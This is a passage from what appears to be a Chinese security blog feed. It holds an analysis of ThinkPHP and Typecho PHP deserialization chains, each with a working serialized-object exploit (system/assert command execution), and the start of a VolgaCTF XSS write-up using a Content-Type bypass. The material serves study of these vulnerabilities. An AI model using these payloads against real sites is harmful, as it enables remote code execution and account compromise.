<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure>

<p>在这里可以很明显的看到有字符串拼接，将这两个变量随便一个设置为我们想要触发的类就可以触发后面的链了，后面的链在上一篇文章也分析过，这里就不详细分析了。</p>
<p>调用栈如下</p>
<p><img src="https://s2.ax1x.com/2019/10/09/u5h9sI.png" alt="u5h9sI.png"></p>
<p>这个poc感觉也是很值得参考学习</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- Created by PhpStorm.</span></span><br><span class="line"><span class="comment">- User: wh1t3P1g</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> RelationShip&#123;</span><br><span class="line">        <span class="keyword">private</span> $relation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">        <span class="keyword">private</span> $withAttr;</span><br><span class="line">        <span class="keyword">private</span> $data;</span><br><span class="line">        <span class="keyword">protected</span> $type;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> ModelEvent&#123;</span><br><span class="line">        <span class="keyword">protected</span> $withEvent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $force;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $suffix;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($obj == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"calc.exe"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;[]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible= <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;[]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"system"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"calc.exe"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="string">"mysql"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;suffix = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>($<span class="title">obj</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title">parent</span>::<span class="title">__construct</span>($<span class="title">obj</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">pivot1</span> = <span class="title">new</span> \<span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">null</span>);</span><br><span class="line">    $pivot2 = <span class="keyword">new</span> \think\model\Pivot($pivot1);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($pivot2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.anquanke.com/post/id/187819#h2-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187819#h2-6</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Typecho反序列化漏洞分析</title>
    <url>/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在学反序列化的时候就听过<code>typecho</code>这个比较巧妙的反序列化漏洞，故此来进行一次分析学习。</p>
<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>反序列化漏洞的出现点在<code>install.php</code>，不过到触发反序列化点之前还有一个点需要绕过的地方，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</span><br><span class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有两个判断第一个只有传入<code>finish=xxx</code>就可以绕过，第二个由于是本地实验，不存在跨站请求的问题。接下来进入漏洞入口点<code>install.php 232行到237行</code>，代码如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5JMmd.png" alt="Z5JMmd.png"></p>
<p>可以看到我们所需要的关键字<code>unserialize</code>了，跟进<code>Typecho_Cookie::get</code>方法(全局搜索)，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键语句为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br></pre></td></tr></table></figure>

<p>当代码中传入<code>__typecho_config</code>时，会对<code>$cookie[__typecho_config]</code>进行检测，如果没有的话，由<code>$_POST[&#39;__typecho_config&#39;]</code>决定，所以我们可以通过<code>post</code>来控制<strong>反序列化的值</strong>。接着向下看，有一个<code>new Typecho</code>的操作,跟进这个类，并且查看<code>__construct</code>魔术方法，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现危险操作<code>$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>，进行了一个字符串拼接,如果单看这个简单的字符串拼接确实是没有危险的，但是<code>$adaptername</code>是由我们控制的，如果我们将<code>$adaptername</code>设为一个类，那么就会触发该类的<code>__toString</code>魔术方法，全局搜索一下<code>__toString</code>。</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5Y2PP.png" alt="Z5Y2PP.png"></p>
<p>共发现三处<code>__toString</code>魔术方法，不过<code>Config.php</code>和<code>Query.php</code>中的<code>__toString</code>方法并没有什么作用，主要来看一下<code>Feed.php</code>中的<code>__toString</code>。(由于比较长，只截取有问题的部分代码)</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5tlJP.png" alt="Z5tlJP.png"></p>
<p>可以看到<code>Typecho_Feed</code>类中的<code>__toString</code>方法中也是存在危险操作的，我们同样是可以控制<code>$item[&#39;author&#39;]</code>的，如果我们将这个设置为一个类，这个类去访问不存在的<code>screenName</code>就会触发<code>__get</code>魔术方法，全局搜索一下<code>__get</code>。</p>
<p><a href="https://imgchr.com/i/Z5NSl8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/14/Z5NSl8.png" alt="Z5NSl8.png"></a></p>
<p>跟进<code>Request.php</code>中的<code>__get</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>get</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>_applyFilter</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了我们想要的<code>call_user_func</code>函数了，再回去看一下$value是怎么控制的，我们可以给<code>_params[&#39;screenName&#39;]</code>赋值为<code>phpinfo()</code>,再将<code>$_filter</code>数组添加命令执行函数，就可以打出我们想要的内容了。不过构造完<code>exp</code>打过去确实<code>500</code>，这里是因为<code>install.php</code>调用了<code>ob_start</code>函数，看一下官方手册对此函数的介绍.</p>
<p><img src="https://s2.ax1x.com/2019/07/14/Z5UW26.png" alt="Z5UW26.png"></p>
<p><strong>因为我们上面对象注入的代码触发了原本的exception，导致<code>ob_end_clean()</code>执行，原本的输出会在缓冲区被清理。</strong></p>
<p>看一下<code>excepetion</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exceptionHandle</span><span class="params">($exception)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (defined(<span class="string">'__TYPECHO_DEBUG__'</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;&lt;code&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span> . htmlspecialchars($exception-&gt;getMessage()) . <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> htmlspecialchars($exception-&gt;__toString());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/code&gt;&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">404</span> == $exception-&gt;getCode() &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">self</span>::$exceptionHandle)) &#123;</span><br><span class="line">                $handleClass = <span class="keyword">self</span>::$exceptionHandle;</span><br><span class="line">                <span class="keyword">new</span> $handleClass($exception);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>::error($exception);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在触发后，会在<code>else</code>调用<code>ob_end_clean</code>来清空我们的输出，解决这个问题有两个方法(采自pupil师傅)</p>
<ol>
<li>因为 <code>call_user_func</code>函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。</li>
<li>第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。</li>
</ol>
<p>通过<code>&#39;category&#39; =&gt; array(new Typecho_Request()),</code>，将数组里封装入一个对象。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'category'</span>]) &amp;&amp; is_array($item[<span class="string">'category'</span>])) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($item[<span class="string">'category'</span>] <span class="keyword">as</span> $category) &#123;</span><br><span class="line">        $content. = <span class="string">'&lt;category&gt;&lt;![CDATA['</span>.$category[<span class="string">'name'</span>].<span class="string">']]&gt;&lt;/category&gt;'</span>.<span class="keyword">self</span>: :EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就会达到报错的效果，使得<code>ob_end_clean</code>无法正常执行，这样就能将我们的内容输出了，最终<code>exp</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'phpinfo()'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">	<span class="keyword">private</span> $_type;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_type=<span class="keyword">$this</span>::RSS2;</span><br><span class="line"> 	    <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">&#125;&#125;</span><br><span class="line">$lihuaiqiu=<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed,</span><br><span class="line">	<span class="string">'prefix'</span>=&gt;<span class="string">'lihuaiqiu'</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($lihuaiqiu));</span><br></pre></td></tr></table></figure>

<p>(ps:这里一定要注意<code>RSS</code>的设置，否则还会<code>500</code>)</p>
<p>最终运行结果</p>
<p><a href="https://imgchr.com/i/Z5afFs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/14/Z5afFs.png" alt="Z5afFs.png"></a></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>反序列化一定要注意找到由合适可以利用的作用域，以及<code>__destruct,__call,__get,__toString</code>这几个魔术方法。</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>VolgaCTF 2020 Qualifier-Web</title>
    <url>/2020/04/22/VolgaCTF-2020-Qualifier-Web/</url>
    <content><![CDATA[<h3 id="UserCenter"><a href="#UserCenter" class="headerlink" title="UserCenter"></a>UserCenter</h3><p>首先大概一下浏览基本功能</p>
<ul>
<li>登陆/注册</li>
<li>查看个人信息以及修改个人信息和头像</li>
<li>Report Bug将URL发送给admin进行xss</li>
</ul>
<p>大概测试了一下，发现如下：</p>
<p>修改个人信息的地方会进行html实体编码没法xss，头像处试过传了下svg，发现不太行，网站对type做了限制，限制了svg以及xml等文件的上传，并且它是把网站上传的图片放到static子域进行储存的。</p>
<p>不过发现我们可以通过控制type的类型来控制返回文件的类型. 我是通过<code>text/plain;,text/html</code>来进行bypass的，因为在Chrome中是支持以逗号分隔的多种内容类型的，所以可以利用这个来进行Bypass.</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQfQCF.png" alt="GQfQCF.png"></p>
<p>看了下国外大哥的wp,发现他fuzz出了更多可执行xss的Content-Type, tql..</p>
<p>详细可以看这篇文章</p>
<p><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html</a></p>
<p>接下来可以看下主页面的main.js..(我刚开始没发现这个文件..)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user-update`</span>,</span><br><span class="line">        data: <span class="built_in">JSON</span>.stringify(user),</span><br><span class="line">        contentType: <span class="string">"application/json"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span></span><br><span class="line">    &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">            showError(data.error);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.<span class="keyword">get</span>(`//$&#123;api&#125;.volgactf-task.ru/logout<span class="string">`, function(data) &#123;</span></span><br><span class="line"><span class="string">        location.replace("/login.html");</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function profile(user, edit) &#123;</span></span><br><span class="line"><span class="string">    if (</span></span><br><span class="line"><span class="string">        !["/profile.html", "/report.php", "/editprofile.html"].includes(</span></span><br><span class="line"><span class="string">            location.pathname</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">        location.replace("/profile.html");</span></span><br><span class="line"><span class="string">    $("#username").text(user.username);</span></span><br><span class="line"><span class="string">    $("#username").val(user.username);</span></span><br><span class="line"><span class="string">    $("#bio").text(user.bio);</span></span><br><span class="line"><span class="string">    $("#bio").val(user.bio);</span></span><br><span class="line"><span class="string">    $("#avatar").attr("src", `</span><span class="comment">//static.volgactf-task.ru/$&#123;user.avatar&#125;`);</span></span><br><span class="line">    <span class="keyword">if</span> (edit) &#123;</span><br><span class="line">        $(<span class="string">"#editProfile"</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/login.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/register.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/profile.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/logout.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceForbiden</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">        .replace(<span class="regexp">/[ !"#$%&amp;Вґ()*+,\-\/:;&lt;=&gt;?@\[\\\]^_`&#123;|&#125;~]/g</span>, <span class="string">""</span>)</span><br><span class="line">        .replace(<span class="regexp">/[^\x00-\x7F]/g</span>, <span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showError</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#error"</span>)</span><br><span class="line">        .removeClass(<span class="string">"d-none"</span>)</span><br><span class="line">        .text(error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#logForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        